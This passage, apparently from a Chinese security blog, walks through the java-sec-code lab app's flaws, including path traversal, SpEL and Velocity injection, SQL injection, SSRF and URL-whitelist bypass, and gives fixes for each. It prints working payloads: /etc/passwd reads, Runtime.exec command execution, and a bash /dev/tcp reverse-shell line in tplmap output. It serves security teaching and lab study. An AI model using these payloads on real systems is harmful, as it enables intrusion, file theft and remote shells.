(http://[::]:4444/) ...::ffff:192.168.8.103 - - [28/Sep/2021 16:06:29] &quot;GET /TouchFile.class HTTP/1.1&quot; 200 - 查看文件 Fastjson 1.2.24 反序列化漏洞深度分析 发现最新版本1.2.67依然可以通过dnslog判断正确是否使用fastjson 9.FileUpload对于文件上传来说，目前这类漏洞在spring里非常少，原因有两点： 大多数公司上传的文件都会到cdn spring的jsp文件必须在web-inf目录下才能执行 除非，可以上传war包到tomcat的webapps目录。 正常上传代码如下： @PostMapping(&quot;/upload&quot;)public String singleFileUpload(@RequestParam(&quot;file&quot;) MultipartFile file, RedirectAttributes redirectAttributes) { if (file.isEmpty()) { // 赋值给uploadStatus.html里的动态参数message redirectAttributes.addFlashAttribute(&quot;message&quot;, &quot;Please select a file to upload&quot;); return &quot;redirect:/file/status&quot;; } try { // Get the file and save it somewhere byte[] bytes = file.getBytes(); Path path = Paths.get(UPLOADED_FOLDER + file.getOriginalFilename()); Files.write(path, bytes); redirectAttributes.addFlashAttribute(&quot;message&quot;, &quot;You successfully uploaded '&quot; + UPLOADED_FOLDER + file.getOriginalFilename() + &quot;'&quot;); } catch (IOException e) { redirectAttributes.addFlashAttribute(&quot;message&quot;, &quot;upload failed&quot;); logger.error(e.toString()); } return &quot;redirect:/file/status&quot;;}@GetMapping(&quot;/status&quot;)public String uploadStatus() { return &quot;uploadStatus&quot;;} 可以看到没有对后缀名，MIME，文件内容等内容进行校验，可以任意上传。 对图片上传做限制后的代码如下 @PostMapping(&quot;/upload/picture&quot;) @ResponseBody public String uploadPicture(@RequestParam(&quot;file&quot;) MultipartFile multifile) throws Exception { if (multifile.isEmpty()) { return &quot;Please select a file to upload&quot;; } String fileName = multifile.getOriginalFilename(); String Suffix = fileName.substring(fileName.lastIndexOf(&quot;.&quot;)); // 获取文件后缀名 String mimeType = multifile.getContentType(); // 获取MIME类型 String filePath = UPLOADED_FOLDER + fileName; File excelFile = convert(multifile); // 判断文件后缀名是否在白名单内 校验1 String[] picSuffixList = {&quot;.jpg&quot;, &quot;.png&quot;, &quot;.jpeg&quot;, &quot;.gif&quot;, &quot;.bmp&quot;, &quot;.ico&quot;}; boolean suffixFlag = false; for (String white_suffix : picSuffixList) { if (Suffix.toLowerCase().equals(white_suffix)) { suffixFlag = true; break; } } if (!suffixFlag) { logger.error(&quot;[-] Suffix error: &quot; + Suffix); deleteFile(filePath); return &quot;Upload failed. Illeagl picture.&quot;; } // 判断MIME类型是否在黑名单内 校验2 String[] mimeTypeBlackList = { &quot;text/html&quot;, &quot;text/javascript&quot;, &quot;application/javascript&quot;, &quot;application/ecmascript&quot;, &quot;text/xml&quot;, &quot;application/xml&quot; }; for (String blackMimeType : mimeTypeBlackList) { // 用contains是为了防止text/html;charset=UTF-8绕过 if (SecurityUtil.replaceSpecialStr(mimeType).toLowerCase().contains(blackMimeType)) { logger.error(&quot;[-] Mime type error: &quot; + mimeType); deleteFile(filePath); return &quot;Upload failed. Illeagl picture.&quot;; } } // 判断文件内容是否是图片 校验3 boolean isImageFlag = isImage(excelFile); deleteFile(randomFilePath); if (!isImageFlag) { logger.error(&quot;[-] File is not Image&quot;); deleteFile(filePath); return &quot;Upload failed. Illeagl picture.&quot;; } try { // Get the file and save it somewhere byte[] bytes = multifile.getBytes(); Path path = Paths.get(UPLOADED_FOLDER + multifile.getOriginalFilename()); Files.write(path, bytes); } catch (IOException e) { logger.error(e.toString()); deleteFile(filePath); return &quot;Upload failed&quot;; } logger.info(&quot;[+] Safe file. Suffix: {}, MIME: {}&quot;, Suffix, mimeType); logger.info(&quot;[+] Successfully uploaded {}&quot;, filePath); return String.format(&quot;You successfully uploaded '%s'&quot;, filePath); } private void deleteFile(String filePath) { File delFile = new File(filePath); if(delFile.isFile() &amp;&amp; delFile.exists()) { if (delFile.delete()) { logger.info(&quot;[+] &quot; + filePath + &quot; delete successfully!&quot;); return; } } logger.info(filePath + &quot; delete failed!&quot;); } 1.对文件名做了白名单限制{“.jpg”, “.png”, “.jpeg”, “.gif”, “bmp”, “.ico”} 只允许对这些文件进行上传 String[] picSuffixList = {&quot;.jpg&quot;, &quot;.png&quot;, &quot;.jpeg&quot;, &quot;.gif&quot;, &quot;.bmp&quot;, &quot;.ico&quot;};boolean suffixFlag = false;for (String white_suffix : picSuffixList) { if (Suffix.toLowerCase().equals(white_suffix)) { suffixFlag = true; break; }}if (!suffixFlag) { logger.error(&quot;[-] Suffix error: &quot; + Suffix); deleteFile(filePath); return &quot;Upload failed. Illeagl picture.&quot;;} 2.判断MIME类型是否在黑名单内 &quot;text/html&quot;,&quot;text/javascript&quot;,&quot;application/javascript&quot;,&quot;application/ecmascript&quot;,&quot;text/xml&quot;,&quot;application/xml&quot; 3.使用contains为了防止text/html;charset=UTF-8绕过 if (SecurityUtil.replaceSpecialStr(mimeType).toLowerCase().contains(blackMimeType)) { logger.error(&quot;[-] Mime type error: &quot; + mimeType); deleteFile(filePath); return &quot;Upload failed. Illeagl picture.&quot;;} 4.使用IsImage()函数调用ImageIO.read()函数来检测内容是否为文件 private static boolean isImage(File file) throws IOException { BufferedImage bi = ImageIO.read(file); return bi != null;} 5.上传文件时会通过uuid生成一个’/tmp’ + uuid + ‘png’ 这样的文件名，然后最后删除掉 try { // Get the file and save it somewhere byte[] bytes = multifile.getBytes(); Path path = Paths.get(UPLOADED_FOLDER + multifile.getOriginalFilename()); Files.write(path, bytes); } catch (IOException e) { logger.error(e.toString()); deleteFile(filePath); return &quot;Upload failed&quot;; } logger.info(&quot;[+] Safe file. Suffix: {}, MIME: {}&quot;, Suffix, mimeType); logger.info(&quot;[+] Successfully uploaded {}&quot;, filePath); return String.format(&quot;You successfully uploaded '%s'&quot;, filePath);}private void deleteFile(String filePath) { File delFile = new File(filePath); if(delFile.isFile() &amp;&amp; delFile.exists()) { if (delFile.delete()) { logger.info(&quot;[+] &quot; + filePath + &quot; delete successfully!&quot;); return; } } logger.info(filePath + &quot; delete failed!&quot;);} 存在未对文件名做校验，存在路径穿越漏洞，参数修改为../../Users/oldthree/Documents/0.OL4THREE/0.Base/apache-tomcat-8.5.70/webapps/java_sec_code_war/1.png 我们可以上传图片到任意目录，上传图片马不解析 ─ol4three ~/Documents/0.OL4THREE/0.Base/apache-tomcat-8.5.70/webapps/java_sec_code_war╰─$ ls1.png META-INF WEB-INF 直接进行访问即可 由于会重新随机生成文件名未在检测中进行，导致上传jsp失败仍然会在/tmp目录下进行生成随机数生成的.jsp ╭─ol4three /tmp╰─$ ls06dc320d-35fb-11ec-937b-c91feee9eae9.jsp1989897e-35fb-11ec-937b-195f26ab9cc0.jsp2156c28f-35fb-11ec-937b-a71889553c3e.jsp 使用文件上传any接口上传jsp文件解析利用如下： 10.GetRequestURI 当应用存在静态资源目录，比如/css/目录，在权限校验时一般会选择放行，即不校验权限。研发同学用getRequestURI()获取URI后，判断是否包含 /css/字符串，如果包含则不校验权限。此时如果URI为/css/../hello，用getRequestURI()获取的URI是/css/../hello，包含/css/字符串，所以不校验权限。但是此时后端的路由为/hello，导致权限绕过。 核心代码如下： @GetMapping(value = &quot;/exclued/vuln&quot;)public String exclued(HttpServletRequest request) { String[] excluedPath = {&quot;/css/**&quot;, &quot;/js/**&quot;}; String uri = request.getRequestURI(); // Security: request.getServletPath() PathMatcher matcher = new AntPathMatcher(); logger.info(&quot;getRequestURI: &quot; + uri); logger.info(&quot;getServletPath: &quot; + request.getServletPath()); for (String path : excluedPath) { if (matcher.match(path, uri)) { return &quot;You have bypassed the login page.&quot;; } } return &quot;This is a login page &gt;..&lt;&quot;;} 可以看到判断包含/css/和/js/字符串如果包含则不进行校验权限 由于作者写的时候是使用根目录检测需要/css/..;/exclued/vuln 开头，可以修改网站根目录进行测试或者，手动调试修改代码 使用curl进行验证发现可以成功绕过return “You have bypasswd the login page.” ╰─$ curl -i -s -k -X $'GET' \\ -H $'Upgrade-Insecure-Requests: 1' -H $'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36' -H $'Referer: http://172.20.10.6:8080/java_sec_code_war/login' \\ -b $'JSESSIONID=41B2022F0376956FF0E5583CEC92FD3B; XSRF-TOKEN=7de740ac-305e-41b3-b711-438a1b068f77; remember-me=YWRtaW46MTYzNjM2NzI0NjU0NDozNTYwZjNiODFiODBhOTYxOTcxZGM4YWQ2NDY5ZTExZA' \\ $'http://172.20.10.6:8080/java_sec_code_war/uri/css/..;/exclued/vuln'HTTP/1.1 200X-Application-Context: applicationX-Content-Type-Options: nosniffX-XSS-Protection: 1; mode=blockCache-Control: no-cache, no-store, max-age=0, must-revalidatePragma: no-cacheExpires: 0X-Frame-Options: DENYContent-Type: text/plain;charset=UTF-8Content-Length: 33You have bypassed the login page.% 使用浏览器访问如下：http://172.20.10.6:8080/java_sec_code_war/uri/css/..;/exclued/vuln 安全的方法是使用：getServletPath()方法，该方法会自动对URL 2021-10-25 18:28:11.268 INFO 2967 --- [nio-8080-exec-5] org.joychou.controller.GetRequestURI : getRequestURI: /css/..;/exclued/vuln2021-10-25 18:28:11.268 INFO 2967 --- [nio-8080-exec-5] org.joychou.controller.GetRequestURI : getServletPath: /exclued/vuln 使用getServletPath()方法对URI进行标准化(normalize)，先对URI进行URLDecode，如果存在/../，将其返回到上一级目录，即/css/..;/exclued/vuln/处理为/exclued/vuln/，并将新的Path设置为servletPath。 11.PathTraversal路径遍历攻击（也称为目录遍历）是指在访问储存在web根目录文件夹之外的文件和目录。通过操纵带有“点-斜线（..）”序列及其变化的文件或使用绝对文件路径来引用文件的变量，可以访问存储在文件系统上的任意文件和目录，包括应用程序源代码、配置和关键系统文件。 核心代码： /** * http://localhost:8080/path_traversal/vul?filepath=../../../../../etc/passwd */@GetMapping(&quot;/path_traversal/vul&quot;)public String getImage(String filepath) throws IOException { return getImgBase64(filepath);} private String getImgBase64(String imgFile) throws IOException { logger.info(&quot;Working directory: &quot; + System.getProperty(&quot;user.dir&quot;)); logger.info(&quot;File path: &quot; + imgFile); File f = new File(imgFile); if (f.exists() &amp;&amp; !f.isDirectory()) { byte[] data = Files.readAllBytes(Paths.get(imgFile)); return new String(Base64.encodeBase64(data)); } else { return &quot;File doesn't exist or is not a file.&quot;; }} 没有对文件名做校验存在漏洞 访问http://172.20.10.6:8080/java_sec_code_war/path_traversal/vul?filepath=../../../../../../../../etc/passwd 修复代码： @GetMapping(&quot;/path_traversal/sec&quot;)public String getImageSec(String filepath) throws IOException { if (SecurityUtil.pathFilter(filepath) == null) { logger.info(&quot;Illegal file path: &quot; + filepath); return &quot;Bad boy. Illegal file path.&quot;; } return getImgBase64(filepath);} 利用pathFilter对输入的路径进行过滤，跟进去查看pathFilter()函数 public static String pathFilter(String filepath) { String temp = filepath; // use while to sovle multi urlencode while (temp.indexOf('%') != -1) { try { temp = URLDecoder.decode(temp, &quot;utf-8&quot;); } catch (UnsupportedEncodingException e) { logger.info(&quot;Unsupported encoding exception: &quot; + filepath); return null; } catch (Exception e) { logger.info(e.toString()); return null; } } if (temp.contains(&quot;..&quot;) || temp.charAt(0) == '/') { return null; } return filepath;} 对输入的参数先做检测若是URL编码先做解码，然后检测对”..”,”/“参数做过滤。 12.SpEL Spring Expression Language（简称SpEL）是一种强大的表达式语言，支持在运行时查询和操作对象图。语言语法类似于Unified EL，但提供了额外的功能，特别是方法调用和基本的字符串模板功能。同时因为SpEL是以API接口的形式创建的，所以允许将其集成到其他应用程序和框架中。 核心代码： @GetMapping(&quot;/spel/vuln&quot;)public String rce(String expression) { ExpressionParser parser = new SpelExpressionParser(); // fix method: SimpleEvaluationContext return parser.parseExpression(expression).getValue().toString();} 直接将用户的输入当作表达式内容进行解析。 输入一个简单的乘法运算2*2，可以看到返回的值是经过解析后的4 执行下系统命令 http://172.20.10.6:8080/java_sec_code_war/spel/vuln/?expression=T(java.lang.Runtime).getRuntime().exec(%22open%20-a%20Calculator%22) SPEL表达式注入-入门篇 由浅入深SpEL表达式注入漏洞 13.SQLISql注入修改mysql的配置之后即可进行，整体比较简单 核心代码： @RequestMapping(&quot;/jdbc/vuln&quot;)public String jdbc_sqli_vul(@RequestParam(&quot;username&quot;) String username) { StringBuilder result = new StringBuilder(); try { Class.forName(driver); Connection con = DriverManager.getConnection(url, user, password); if (!con.isClosed()) System.out.println(&quot;Connect to database successfully.&quot;); // sqli vuln code Statement statement = con.createStatement(); String sql = &quot;select * from users where username = '&quot; + username + &quot;'&quot;; logger.info(sql); ResultSet rs = statement.executeQuery(sql); while (rs.next()) { String res_name = rs.getString(&quot;username&quot;); String res_pwd = rs.getString(&quot;password&quot;); String info = String.format(&quot;%s: %s\\n&quot;, res_name, res_pwd); result.append(info); logger.info(info); } rs.close(); con.close(); } catch (ClassNotFoundException e) { logger.error(&quot;Sorry,can`t find the Driver!&quot;); } catch (SQLException e) { logger.error(e.toString()); } return result.toString();} 直接对输入的username参数进行拼接存在sql注入漏洞 访问url： http://localhost:8080/java_sec_code_war/sqli/mybatis/vuln01?username=joychou%27%20or%20%271%27=%271 控制台输出如下： DEBUG 9753 --- [nio-8080-exec-2] o.j.m.UserMapper.findByUserNameVuln01 : ==&gt; Preparing: select * from users where username = 'joychou' or '1'='1' DEBUG 9753 --- [nio-8080-exec-2] o.j.m.UserMapper.findByUserNameVuln01 : ==&gt; Parameters: DEBUG 9753 --- [nio-8080-exec-2] o.j.m.UserMapper.findByUserNameVuln01 : &lt;== Total: 2 修复代码如下： @RequestMapping(&quot;/jdbc/sec&quot;)public String jdbc_sqli_sec(@RequestParam(&quot;username&quot;) String username) { StringBuilder result = new StringBuilder(); try { Class.forName(driver); Connection con = DriverManager.getConnection(url, user, password); if (!con.isClosed()) System.out.println(&quot;Connecting to Database successfully.&quot;); // fix code String sql = &quot;select * from users where username = ?&quot;; PreparedStatement st = con.prepareStatement(sql); st.setString(1, username); logger.info(st.toString()); // sql after prepare statement ResultSet rs = st.executeQuery(); while (rs.next()) { String res_name = rs.getString(&quot;username&quot;); String res_pwd = rs.getString(&quot;password&quot;); String info = String.format(&quot;%s: %s\\n&quot;, res_name, res_pwd); result.append(info); logger.info(info); } rs.close(); con.close(); } catch (ClassNotFoundException e) { logger.error(&quot;Sorry, can`t find the Driver!&quot;); e.printStackTrace(); } catch (SQLException e) { logger.error(e.toString()); } return result.toString();} prepareStatement()通过预处理方式进行修复 预处理的修复原理：针对字符串类型的SQL注入，是在字符串两边加上一对单号哈''，对于中间点的单引号对其进行转义\\'，让其变成字符的单引号。Mybatis的#{}也是预处理方式处理SQL注入。 在使用了mybatis框架后，需要进行排序功能时，在mapper.xml文件中编写SQL语句时，注意orderBy后的变量要使用${},而不用#{}。因为#{}变量是经过预编译的，${}没有经过预编译。虽然${}存在SQL注入的风险，但orderBy必须使用${}，因为#{}会多出单引号''导致SQL语句失效。为防止SQL注入只能自己对其过滤。 根据下面的结果可以发现order by 'username'并没有用，第一条SQL和第二条SQL效果一样。 select * from users order by 'username' desc -- 结果为 joychou wilson lightless select * from users -- 结果为 joychou wilson lightless select * from users order by username -- 结果为 joychou lightless wilsonselect * from users order by username desc -- 结果为 wilson lightless joychou 14.SSRF1.漏洞简介 SSRF(Server-side Request Forge, 服务端请求伪造)。 由攻击者构造的攻击链接传给服务端执行造成的漏洞，一般用来在外网探测或攻击内网服务。 2.支持协议file ftp mailto http https jar netdoc 如果发起网络请求的类是带HTTP开头，那只支持HTTP、HTTPS协议。 3.重定向Java默认会跟随重定向。先在一台服务器上写一个test.php，代码如下： &lt;?php$url = 'gopher://35.185.163.134:2333/_joy%0achou';header(&quot;location: $url&quot;);?&gt; 启动apache 放置对应文件 sudo apachectl startcp ~/Desktop/test.php /Library/WebServer/Documents 访问payload http://localhost:8080/java_sec_code_war/ssrf/urlConnection/vuln?url=http://127.0.0.1/test.php 收到异常： java.net.MalformedURLException: unknown protocol: gopher 跟踪报错代码： private boolean followRedirect() throws IOException { if(!this.getInstanceFollowRedirects()) { return false; } else { final int var1 = this.getResponseCode(); if(var1 &gt;= 300 &amp;&amp; var1 &lt;= 307 &amp;&amp; var1 != 306 &amp;&amp; var1 != 304) { final String var2 = this.getHeaderField(&quot;Location&quot;); if(var2 == null) { return false; } else { URL var3; try { // 该行代码发生异常，var2变量值为`gopher://35.185.163.134:2333/_joy%0achou` var3 = new URL(var2); /* 该行代码，表示传入的协议必须和重定向的协议一致 * 即http://joychou.me/302.php的协议必须和gopher://35.185.163.134:2333/_joy%0achou一致 */ if(!this.url.getProtocol().equalsIgnoreCase(var3.getProtocol())) { return false; } } catch (MalformedURLException var8) { var3 = new URL(this.url, var2); } 从上面的followRedirect方法可以看到： 实际跳转的URL也在限制的协议内 传入的URL协议必须和重定向后的URL协议一致。如果不一致，相当于没有进行重定向，返回空页面。 所以，Java的SSRF利用方式比较局限： 利用file协议任意文件读取 利用http协议探测端口或攻击内网服务 4.DNS Rebinding先了解下Java应用的TTL机制。Java应用的默认TTL为10s，这个默认配置会导致DNS Rebinding绕过失败。也就是说，默认情况下，Java应用不受DNS Rebinding影响。 Java TTL的值可以通过下面三种方式进行修改： JVM添加启动参数-Dsun.net.inetaddr.ttl=0 通过代码进行修改 java.security.Security.setProperty(&quot;networkaddress.cache.negative.ttl&quot; , &quot;0&quot;); 修改java.security里的networkaddress.cache.negative.ttl变量为0 5.总结 Java默认跟随重定向； Java默认TTL为10； 是否受DNS Rebinding影响取决于缓存； 如果发起网络请求的类是带HTTP开头，那只支持HTTP、HTTPS协议。 传入的URL协议必须和重定向后的URL协议一致。如果不一致，相当于没有进行重定向，返回空页面。 核心代码： @RequestMapping(value = &quot;/urlConnection/vuln&quot;, method = {RequestMethod.POST, RequestMethod.GET})public String URLConnectionVuln(String url) { return HttpUtils.URLConnection(url);} 跟进URLConnectiong(url) public static String URLConnection(String url) { try { URL u = new URL(url); URLConnection urlConnection = u.openConnection(); BufferedReader in = new BufferedReader(new InputStreamReader(urlConnection.getInputStream())); //send request // BufferedReader in = new BufferedReader(new InputStreamReader(u.openConnection().getInputStream())); String inputLine; StringBuilder html = new StringBuilder(); while ((inputLine = in.readLine()) != null) { html.append(inputLine); } in.close(); return html.toString(); } catch (Exception e) { logger.error(e.getMessage()); return e.getMessage(); }} 直接调用了URLConnection()方法 导致存在任意文件读 http://localhost:8080/java_sec_code_war/ssrf/urlConnection/vuln?url=file:///etc/passwd 修复代码如下： @GetMapping(&quot;/urlConnection/sec&quot;)public String URLConnectionSec(String url) { // Decline not http/https protocol if (!SecurityUtil.isHttp(url)) { return &quot;[-] SSRF check failed&quot;; } try { SecurityUtil.startSSRFHook(); return HttpUtils.URLConnection(url); } catch (SSRFException | IOException e) { return e.getMessage(); } finally { SecurityUtil.stopSSRFHook(); }} 首先通过isHTTP()函数来看判断是否是http和https协议，之后调用钩子去调用SocketHookFactory，具体防护在SSRFChecker.java package org.joychou.security.ssrf;import java.net.HttpURLConnection;import java.net.InetAddress;import java.net.URI;import java.net.URL;import java.util.ArrayList;import org.apache.commons.lang.StringUtils;import org.apache.commons.net.util.SubnetUtils;import org.joychou.config.WebConfig;import org.joychou.security.SecurityUtil;import org.slf4j.Logger;import org.slf4j.LoggerFactory;public class SSRFChecker { private static Logger logger = LoggerFactory.getLogger(SSRFChecker.class); public static boolean checkURLFckSSRF(String url) { if (null == url) { return false; } ArrayList&lt;String&gt; ssrfSafeDomains = WebConfig.getSsrfSafeDomains(); try { String host = SecurityUtil.gethost(url); // 必须http/https if (!SecurityUtil.isHttp(url)) { return false; } if (ssrfSafeDomains.contains(host)) { return true; } for (String ssrfSafeDomain : ssrfSafeDomains) { if (host.endsWith(&quot;.&quot; + ssrfSafeDomain)) { return true; } } } catch (Exception e) { logger.error(e.toString()); return false; } return false; } /** * 解析url的ip，判断ip是否是内网ip，所以TTL设置为0的情况不适用。 * url只允许https或者http，并且设置默认连接超时时间。 * 该修复方案会主动请求重定向后的链接。 * * @param url check的url * @param checkTimes 设置重定向检测的最大次数，建议设置为10次 * @return 安全返回true，危险返回false */ public static boolean checkSSRF(String url, int checkTimes) { HttpURLConnection connection; int connectTime = 5 * 1000; // 设置连接超时时间5s int i = 1; String finalUrl = url; try { do { // 判断当前请求的URL是否是内网ip if (isInternalIpByUrl(finalUrl)) { logger.error(&quot;[-] SSRF check failed. Dangerous url: &quot; + finalUrl); return false; // 内网ip直接return，非内网ip继续判断是否有重定向 } connection = (HttpURLConnection) new URL(finalUrl).openConnection(); connection.setInstanceFollowRedirects(false); connection.setUseCaches(false); // 设置为false，手动处理跳转，可以拿到每个跳转的URL connection.setConnectTimeout(connectTime); //connection.setRequestMethod(&quot;GET&quot;); connection.connect(); // send dns request int responseCode = connection.getResponseCode(); // 发起网络请求 if (responseCode &gt;= 300 &amp;&amp; responseCode &lt;= 307 &amp;&amp; responseCode != 304 &amp;&amp; responseCode != 306) { String redirectedUrl = connection.getHeaderField(&quot;Location&quot;); if (null == redirectedUrl) break; finalUrl = redirectedUrl; i += 1; // 重定向次数加1 logger.info(&quot;redirected url: &quot; + finalUrl); if (i == checkTimes) { return false; } } else break; } while (connection.getResponseCode() != HttpURLConnection.HTTP_OK); connection.disconnect(); } catch (Exception e) { return true; // 如果异常了，认为是安全的，防止是超时导致的异常而验证不成功。 } return true; // 默认返回true } /** * 判断一个URL的IP是否是内网IP * * @return 如果是内网IP，返回true；非内网IP，返回false。 */ public static boolean isInternalIpByUrl(String url) { String host = url2host(url); if (host.equals(&quot;&quot;)) { return true; // 异常URL当成内网IP等非法URL处理 } String ip = host2ip(host); if (ip.equals(&quot;&quot;)) { return true; // 如果域名转换为IP异常，则认为是非法URL } return isInternalIp(ip); } /** * 使用SubnetUtils库判断ip是否在内网网段 * * @param strIP ip字符串 * @return 如果是内网ip，返回true，否则返回false。 */ static boolean isInternalIp(String strIP) { if (StringUtils.isEmpty(strIP)) { logger.error(&quot;[-] SSRF check failed. IP is empty. &quot; + strIP); return true; } ArrayList&lt;String&gt; blackSubnets = WebConfig.getSsrfBlockIps(); for (String subnet : blackSubnets) { SubnetUtils utils = new SubnetUtils(subnet); if (utils.getInfo().isInRange(strIP)) { logger.error(&quot;[-] SSRF check failed. Internal IP: &quot; + strIP); return true; } } return false; } /** * host转换为IP * 会将各种进制的ip转为正常ip * 167772161转换为10.0.0.1 * 127.0.0.1.xip.io转换为127.0.0.1 * * @param host 域名host */ private static String host2ip(String host) { try { InetAddress IpAddress = InetAddress.getByName(host); // send dns request return IpAddress.getHostAddress(); } catch (Exception e) { return &quot;&quot;; } } /** * 从URL中获取host，限制为http/https协议。只支持http:// 和 https://，不支持//的http协议。 * * @param url http的url */ private static String url2host(String url) { try { // 使用URI，而非URL，防止被绕过。 URI u = new URI(url); if (SecurityUtil.isHttp(url)) { return u.getHost(); } return &quot;&quot;; } catch (Exception e) { return &quot;&quot;; } }} 15.SSTI ssti服务端模板注入，ssti主要为python的一些框架 jinja2、 mako tornado 、django，PHP框架smarty twig，java框架FreeMarker、jade、 velocity等等使用了渲染函数时，由于代码不规范或信任了用户输入而导致了服务端模板注入，模板渲染其实并没有漏洞，主要是程序员对代码不规范不严谨造成了模板注入漏洞，造成模板可控。 核心代码： @GetMapping(&quot;/velocity&quot;)public void velocity(String template) { Velocity.init(); VelocityContext context = new VelocityContext(); context.put(&quot;author&quot;, &quot;Elliot A.&quot;); context.put(&quot;address&quot;, &quot;217 E Broadway&quot;); context.put(&quot;phone&quot;, &quot;555-1337&quot;); StringWriter swOut = new StringWriter(); Velocity.evaluate(context, swOut, &quot;test&quot;, template);} 访问URL： http://192.168.137.16:8080/java_sec_code_war/ssti/velocity?template=%23set($e=%22e%22);$e.getClass().forName(%22java.lang.Runtime%22).getMethod(%22getRuntime%22,null).invoke(null,null).exec(%22open%20-a%20Calculator%22) 也可以使用https://github.com/epinna/tplmap来验证 git clone https://github.com/epinna/tplmappython tplmap.py --os-shell -u 'http://localhost:8080/ssti/velocity?template=aa' [+] Testing if GET parameter 'template' is injectable[+] Smarty plugin is testing rendering with tag '*'[+] Smarty plugin is testing blind injection[+] Mako plugin is testing rendering with tag '${*}'[+] Mako plugin is testing blind injection[+] Python plugin is testing rendering with tag 'str(*)'[+] Python plugin is testing blind injection[+] Tornado plugin is testing rendering with tag '{{*}}'[+] Tornado plugin is testing blind injection[+] Jinja2 plugin is testing rendering with tag '{{*}}'[+] Jinja2 plugin is testing blind injection[+] Twig plugin is testing rendering with tag '{{*}}'[+] Twig plugin is testing blind injection[+] Freemarker plugin is testing rendering with tag '*'[+] Freemarker plugin is testing blind injection[+] Velocity plugin is testing rendering with tag '*'[+] Velocity plugin is testing blind injection[+] Velocity plugin has confirmed blind injection[+] Tplmap identified the following injection point: GET parameter: template Engine: Velocity Injection: * Context: text OS: undetected Technique: blind Capabilities: Shell command execution: ok (blind) Bind and reverse shell: ok File write: ok (blind) File read: no Code evaluation: no[+] Blind injection has been found and command execution will not produce any output.[+] Delay is introduced appending '&amp;&amp; sleep &lt;delay&gt;' to the shell commands. True or False is returned whether it returns successfully or not.[+] Run commands on the operating system. (blind) $ idTrue (blind) $ whoamiTrue (blind) $ bash -i &gt;&amp; /dev/tcp/reverse_ip/2333 0&gt;&amp;1 修复意见： 针对于不同的模板引擎，该漏洞的修复方法会有所不同，但如果在传递给模板指令之前，对用户输入进行安全过滤的话，则可以大大减少这类威胁。此外，另一种防御方法是使用沙箱环境，将危险的指令删除/禁用，或者对系统环境进行安全加固。 白头搔更短，SSTI惹人心 16.URLRedirecturl重定向漏洞也称url任意跳转漏洞，网站信任了用户的输入导致恶意攻击，url重定向主要用来钓鱼，比如url跳转中最常见的跳转在登陆口，支付口，也就是一旦登陆将会跳转任意自己构造的网站，如果设置成自己的url则会造成钓鱼。 url跳转常见的地方 1. 登陆跳转我认为是最常见的跳转类型，认证完后会跳转，所以在登陆的时候建议多观察url参数2. 用户分享、收藏内容过后，会跳转3. 跨站点认证、授权后，会跳转4. 站内点击其它网址链接时，会跳转5. 在一些用户交互页面也会出现跳转，如请填写对客服评价，评价成功跳转主页，填写问卷，等等业务，注意观察url。6. 业务完成后跳转这可以归结为一类跳转，比如修改密码，修改完成后跳转登陆页面，绑定银行卡，绑定成功后返回银行卡充值等页面，或者说给定一个链接办理VIP，但是你需要认证身份才能访问这个业务，这个时候通常会给定一个链接，认证之后跳转到刚刚要办理VIP的页面。 url跳转常用到的参数 redirecturlredirectUrlcallbackreturn_urltoUrlReturnUrlfromUrlredUrlrequestredirect_toredirect_urljumpjump_totargettogotolinklinktodomainoauth_callback 核心代码： 重定向跳转： @GetMapping(&quot;/redirect&quot;)public String redirect(@RequestParam(&quot;url&quot;) String url) { return &quot;redirect:&quot; + url;} 301跳转： @RequestMapping(&quot;/setHeader&quot;)@ResponseBodypublic static void setHeader(HttpServletRequest request, HttpServletResponse response) { String url = request.getParameter(&quot;url&quot;); response.setStatus(HttpServletResponse.SC_MOVED_PERMANENTLY); // 301 redirect response.setHeader(&quot;Location&quot;, url);} 302跳转： @RequestMapping(&quot;/sendRedirect&quot;)@ResponseBodypublic static void sendRedirect(HttpServletRequest request, HttpServletResponse response) throws IOException { String url = request.getParameter(&quot;url&quot;); response.sendRedirect(url); // 302 redirect} 修复方式： 只能内部跳转 @RequestMapping(&quot;/forward&quot;)@ResponseBodypublic static void forward(HttpServletRequest request, HttpServletResponse response) { String url = request.getParameter(&quot;url&quot;); RequestDispatcher rd = request.getRequestDispatcher(url); try { rd.forward(request, response); } catch (Exception e) { e.printStackTrace(); }} 通过checkURL去检查输入的参数 @RequestMapping(&quot;/sendRedirect/sec&quot;) @ResponseBody public void sendRedirect_seccode(HttpServletRequest request, HttpServletResponse response) throws IOException { String url = request.getParameter(&quot;url&quot;); if (SecurityUtil.checkURL(url) == null) { response.setStatus(HttpServletResponse.SC_FORBIDDEN); response.getWriter().write(&quot;url forbidden&quot;); return; } response.sendRedirect(url); }} 跟进 /** * 同时支持一级域名和多级域名，相关配置在resources目录下url/url_safe_domain.xml文件。 * 优先判断黑名单，如果满足黑名单return null。 * * @param url the url need to check * @return Safe url returns original url; Illegal url returns null; */public static String checkURL(String url) { if (null == url){ return null; } ArrayList&lt;String&gt; safeDomains = WebConfig.getSafeDomains(); ArrayList&lt;String&gt; blockDomains = WebConfig.getBlockDomains(); try { String host = gethost(url); // 必须http/https if (!isHttp(url)) { return null; } // 如果满足黑名单返回null if (blockDomains.contains(host)){ return null; } for(String blockDomain: blockDomains) { if(host.endsWith(&quot;.&quot; + blockDomain)) { return null; } } // 支持多级域名 if (safeDomains.contains(host)){ return url; } // 支持一级域名 for(String safedomain: safeDomains) { if(host.endsWith(&quot;.&quot; + safedomain)) { return url; } } return null; } catch (NullPointerException e) { logger.error(e.toString()); return null; }} 检测相关url是否在自己配置中，若不在则返回NULL 17.URLWhiteList1.前言 安全工程师：接口需要验证参数中的URL是否是内部域名。开发工程师：好的，没问题。 如果不使用已经写好的安全框架，真正让开发去添加一个URL白名单，我相信不少人会出现不同程度的安全问题。 所以，我觉得有必要单独拿出来简单说下这个问题。 2.可造成的漏洞和URL有关系的漏洞，我们可以联想到包括但不局限于下面的漏洞 CSRF JSONP SSRF URL跳转 绕过CORS(跨域资源分享) 3.Bypass Poc及实际案例先来看一下应该如何安全验证： 先来看下应该如何安全验证： 取一级域名 判断一级域名是否在白名单里 但是，在实际的甲方安全中，很多开发者会犯以下的一些错误。 1.endsWithBypass Poc: bypassjoychou.com 案例：飞猪做referer校验的时候，全站存在referer校验bypass问题，导致全站存在Json Hijack等漏洞，可以拿到飞猪的开房记录等信息。目前漏洞已经修复。 绕过的poc Referer: https://www.joychoualitrip.com/mytrip/ 